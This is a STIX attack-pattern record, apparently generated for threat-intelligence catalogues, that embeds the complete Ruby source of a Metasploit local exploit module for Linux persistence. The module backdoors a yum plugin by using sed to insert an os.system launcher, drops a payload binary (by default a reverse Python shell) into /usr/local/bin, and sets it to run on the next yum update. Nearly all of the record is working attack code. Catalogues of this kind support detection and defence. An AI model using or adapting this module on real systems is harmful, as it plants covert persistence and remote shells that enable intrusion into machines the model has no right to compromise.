{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1871901e-d6e2-411f-9b39-5a8b41363251",
    "created": "2024-08-14T16:58:50.529364Z",
    "modified": "2024-08-14T16:58:50.529376Z",
    "name": "Yum Package Manager Persistence",
    "description": "( This module will run a payload when the package manager is used. No handler is ran automatically so you must configure an appropriate exploit/multi/handler to connect. Module modifies a yum plugin to launch a binary of choice. grep -F 'enabled=1' /etc/yum/pluginconf.d/ will show what plugins are currently enabled on the system. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/yum_package_manager_persistence.rb",
            "external_id": "yum_package_manager_persistence.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yum Package Manager Persistence',\n      'Description'    => %q(\n        This module will run a payload when the package manager is used. No\n        handler is ran automatically so you must configure an appropriate\n        exploit/multi/handler to connect. Module modifies a yum plugin to\n        launch a binary of choice. grep -F 'enabled=1' /etc/yum/pluginconf.d/\n        will show what plugins are currently enabled on the system.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         => ['Aaron Ringo'],\n      'Platform'       => ['linux', 'unix'],\n      'Arch'           =>\n        [\n          ARCH_CMD,\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultOptions' => {\n                            'WfsDelay' => 0, 'DisablePayloadHandler' => true,\n                            'Payload'  => 'cmd/unix/reverse_python'\n                          },\n      'DisclosureDate' => '2003-12-17', # Date published, Robert G. Browns documentation on Yum\n      'References'     => ['URL', 'https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins'],\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        # /usr/lib/yum-plugins/fastestmirror.py is a default enabled plugin in centos\n        OptString.new('PLUGIN', [true, 'Yum Plugin to target', 'fastestmirror']),\n        OptString.new('BACKDOOR_NAME', [false, 'Name of binary to write'])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('WritableDir', [true, 'A directory where we can write files', '/usr/local/bin/']),\n        OptString.new('PluginPath', [true, 'Plugin Path to use', '/usr/lib/yum-plugins/'])\n      ])\n  end\n\n  def exploit\n    # checks /usr/lib/yum-plugins/PLUGIN.py exists and is writeable\n    plugin = datastore['PLUGIN']\n    full_plugin_path = \"#{datastore['PluginPath']}#{plugin}.py\"\n    print_status(full_plugin_path)\n    unless writable? full_plugin_path\n      fail_with Failure::BadConfig, \"#{full_plugin_path} not writable, does not exist, or yum is not on system\"\n    end\n\n    # /etc/yum.conf must contain plugins=1 for plugins to run at all\n    plugins_enabled = cmd_exec \"grep -F 'plugins=1' /etc/yum.conf\"\n    unless plugins_enabled.include? 'plugins=1'\n      fail_with Failure::NotVulnerable, 'Plugins are not set to be enabled in /etc/yum.conf'\n    end\n    print_good('Plugins are enabled!')\n\n    # /etc/yum/pluginconf.d/PLUGIN.conf must contain enabled=1\n    plugin_conf = \"/etc/yum/pluginconf.d/#{plugin}.conf\"\n    plugin_enabled = cmd_exec \"grep -F 'enabled=1' #{plugin_conf}\"\n    unless plugin_enabled.include? 'enabled=1'\n      print_bad(\"#{plugin_conf} plugin is not configured to run\")\n      fail_with Failure::NotVulnerable, \"try: grep -F 'enabled=1' /etc/yum/pluginconf.d/*\"\n    end\n\n    # plugins are made in python and generate pycs on successful execution\n    unless exist? \"#{full_plugin_path}c\"\n      print_warning('Either Yum has never been executed, or the selected plugin has not run')\n    end\n\n    # check for write in backdoor path and set/generate backdoor name\n    backdoor_path = datastore['WritableDir']\n    unless writable? backdoor_path\n      fail_with Failure::BadConfig, \"#{backdoor_path} is not writable\"\n    end\n    backdoor_name = datastore['BACKDOOR_NAME'] || rand_text_alphanumeric(5..10)\n    backdoor_path << backdoor_name\n\n    # check that the plugin contains an import os, to backdoor\n    import_os_check = cmd_exec \"grep -F 'import os' #{full_plugin_path}\"\n    unless import_os_check.include? 'import os'\n      fail_with Failure::NotVulnerable, \"#{full_plugin_path} does not import os, which is odd\"\n    end\n\n    # check for sed binary and then append launcher to plugin underneath\n    print_status('Attempting to modify plugin')\n    launcher = \"os.system('setsid #{backdoor_path} 2>/dev/null \\\\& ')\"\n    sed_path = cmd_exec \"command -v sed\"\n    unless sed_path.include?('sed')\n      fail_with Failure::NotVulnerable, 'Module uses sed to modify plugin, sed was not found'\n    end\n    sed_line = \"#{sed_path} -ie \\\"/import os/ a #{launcher}\\\" #{full_plugin_path}\"\n    cmd_exec sed_line\n\n    # actually write users payload to be executed then check for write\n    if payload.arch.first == 'cmd'\n      write_file(backdoor_path, payload.encoded)\n    else\n      write_file(backdoor_path, generate_payload_exe)\n    end\n    unless exist? backdoor_path\n      fail_with Failure::Unknown, \"Failed to write #{backdoor_path}\"\n    end\n\n    # change perms to reflect bins in /usr/local/bin/, give good feels\n    chmod(backdoor_path, 0755)\n    print_status(\"Backdoor uploaded to #{backdoor_path}\")\n    print_status('Backdoor will run on next Yum update')\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-12-17, # Date published, Robert G. Browns documentation on Yum",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}